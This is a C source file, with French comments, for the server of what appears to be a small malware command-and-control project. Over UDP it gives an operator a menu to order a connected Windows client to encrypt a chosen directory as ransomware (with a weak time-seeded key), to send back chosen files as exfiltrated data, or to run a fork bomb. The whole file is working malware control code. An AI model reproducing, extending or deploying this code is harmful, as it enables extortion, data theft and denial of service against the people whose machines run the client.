/**
 * @file server.c
 * @brief Implémentation du serveur de contrôle
 * @author Valentin Pizzio
 * @date 21/12/2024
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "server.h"
#include "file_utils.h"
#include "logging.h"
#include "protocol.h"

#pragma comment(lib, "ws2_32.lib")

void init_server(void) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        printf("Failed to initialize winsock\n");
        exit(1);
    }

    ensure_directories_exist();
}

void print_menu(void) {
    printf("\nAvailable commands:\n");
    printf("1. Ransomware\n");
    printf("2. Exfiltration\n");
    printf("3. Fork bomb\n");
    printf("4. Out\n");
}

void handle_command(int choice, SOCKET socket_fd, struct sockaddr_in client_addr, char* current_client_id) {
    Message msg;
    char log_msg[256];
    char key[KEY_LENGTH];

    if (choice == 1) {  // Ransomware
        log_interaction(current_client_id, "COMMAND", "Ransomware requested");
        
        printf("\nAvailable directories:\n");
        char buffer[BUFFER_SIZE];
        list_directories(buffer, BUFFER_SIZE);
        printf("%s", buffer);

        printf("Enter the number of the directory to encrypt: ");
        int dir_choice;
        scanf("%d", &dir_choice);
        clear_stdin();

        char chosen_dir[MAX_FILENAME_LENGTH] = "";
        WIN32_FIND_DATA findData;
        HANDLE hFind = FindFirstFile("*", &findData);
        int count = 0;
        
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                        count++;
                        if (count == dir_choice) {
                            strncpy(chosen_dir, findData.cFileName, MAX_FILENAME_LENGTH - 1);
                            break;
                        }
                    }
                }
            } while (FindNextFile(hFind, &findData));
            FindClose(hFind);
        }

        if (strlen(chosen_dir) > 0) {
            // Generate random key
            srand(time(NULL));
            const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            for (int i = 0; i < KEY_LENGTH - 1; i++) {
                key[i] = charset[rand() % (sizeof(charset) - 1)];
            }
            key[KEY_LENGTH - 1] = '\0';

            msg.cmd = CMD_RANSOMWARE;
            strncpy(msg.filename, chosen_dir, MAX_FILENAME_LENGTH - 1);
            strncpy(msg.data, key, BUFFER_SIZE - 1);

            log_ransomware_key(current_client_id, chosen_dir, key);
            snprintf(log_msg, sizeof(log_msg), "Encrypting directory: %s with key: %s", chosen_dir, key);
            log_interaction(current_client_id, "RANSOMWARE", log_msg);

            sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
                  (struct sockaddr*)&client_addr, sizeof(client_addr));

            int recv_len = recvfrom(socket_fd, (char*)&msg, sizeof(Message), 0,
                                  NULL, NULL);
            if (recv_len > 0) {
                printf("Response from client: %s\n", msg.data);
                snprintf(log_msg, sizeof(log_msg), "Ransomware execution completed: %s", msg.data);
                log_interaction(current_client_id, "RANSOMWARE", log_msg);
            }
        }
    }
    else if (choice == 2) {  // Exfiltration
        log_interaction(current_client_id, "COMMAND", "Exfiltration requested");
        
        char buffer[BUFFER_SIZE];
        list_files(buffer, BUFFER_SIZE);
        msg.cmd = CMD_LIST_FILES;
        strcpy(msg.data, buffer);
        sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
              (struct sockaddr*)&client_addr, sizeof(client_addr));

        printf("\nAvailable files:\n%s", buffer);
        printf("Enter the number of the file to exfiltrate: ");
        int file_choice;
        scanf("%d", &file_choice);
        clear_stdin();

        // Parse the file list to get the selected file
        char* file_list_copy = strdup(buffer);
        char* line = strtok(file_list_copy, "\n");
        int current_number = 1;
        char chosen_file[MAX_FILENAME_LENGTH] = "";

        while (line != NULL) {
            if (current_number == file_choice) {
                // Extract filename (skip the number and dot)
                char* filename_start = strchr(line, '.');
                if (filename_start) {
                    filename_start += 2; // Skip ". "
                    strncpy(chosen_file, filename_start, MAX_FILENAME_LENGTH - 1);
                }
                break;
            }
            current_number++;
            line = strtok(NULL, "\n");
        }
        free(file_list_copy);

        if (strlen(chosen_file) > 0) {
            msg.cmd = CMD_EXFILTRATION;
            strncpy(msg.filename, chosen_file, MAX_FILENAME_LENGTH - 1);
            
            snprintf(log_msg, sizeof(log_msg), "Exfiltrating file: %s", chosen_file);
            log_interaction(current_client_id, "EXFILTRATION", log_msg);

            sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
                  (struct sockaddr*)&client_addr, sizeof(client_addr));

            int recv_len = recvfrom(socket_fd, (char*)&msg, sizeof(Message), 0,
                                  NULL, NULL);
            if (recv_len > 0) {
                save_exfiltrated_content(msg.data, chosen_file, current_client_id);
                printf("File content received and saved\n");
                
                snprintf(log_msg, sizeof(log_msg), "File %s exfiltrated successfully", chosen_file);
                log_interaction(current_client_id, "EXFILTRATION", log_msg);
            }
        }
    }
    else if (choice == 3) {  // Fork bomb
        log_interaction(current_client_id, "COMMAND", "Fork bomb requested");
        msg.cmd = CMD_FORK;
        sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
              (struct sockaddr*)&client_addr, sizeof(client_addr));
    }
}

void handle_client(SOCKET socket_fd, struct sockaddr_in client_addr, char* current_client_id) {
    while(1) {
        int choice;
        print_menu();
        printf("Enter command number: ");
        scanf("%d", &choice);
        clear_stdin();

        if (choice == 4) {
            Message msg;
            msg.cmd = CMD_OUT;
            sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
                  (struct sockaddr*)&client_addr, sizeof(client_addr));
            printf("Client disconnected\n");
            return;
        }

        handle_command(choice, socket_fd, client_addr, current_client_id);
    }
}
